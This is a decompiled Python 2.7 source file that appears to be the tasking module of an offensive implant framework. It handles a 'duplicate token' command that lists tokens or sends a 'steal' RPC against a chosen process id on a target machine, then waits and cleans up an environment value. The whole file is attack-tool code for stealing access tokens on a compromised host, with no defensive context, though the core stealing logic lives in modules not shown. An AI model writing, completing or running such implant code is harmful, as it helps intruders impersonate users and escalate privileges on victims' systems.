# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_DuplicateToken_Tasking.py
_CMD_LIST = 1
_CMD_DUPLICATE = 2

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.env
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.duplicatetoken', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.duplicatetoken.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['cmd'] == _CMD_LIST:
        rpc = mca.security.cmd.duplicatetoken.tasking.RPC_INFO_LIST
    elif lpParams['cmd'] == _CMD_DUPLICATE:
        if lpParams['processId'] == 0:
            mcl.tasking.OutputError('Invalid process id for duplication')
            return False
        tgtParams = mca.security.cmd.duplicatetoken.ParamsSteal()
        tgtParams.processId = lpParams['processId']
        rpc = mca.security.cmd.duplicatetoken.tasking.RPC_INFO_STEAL
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    else:
        mcl.tasking.OutputError('Invalid command type (%d) given' % lpParams['cmd'])
        return False
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.security.cmd.duplicatetoken.errorStrings)
        return False
    else:
        if lpParams['cmd'] == _CMD_DUPLICATE:
            import mcl.tasking.env
            import time
            while not mcl.CheckForStop():
                time.sleep(1)

            try:
                mcl.tasking.env.DeleteValue('_USER_proc%u' % lpParams['processId'], globalValue=True)
            except:
                pass

            return mcl.tasking.TaskSetStatus(mcl.target.CALL_SUCCEEDED)
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)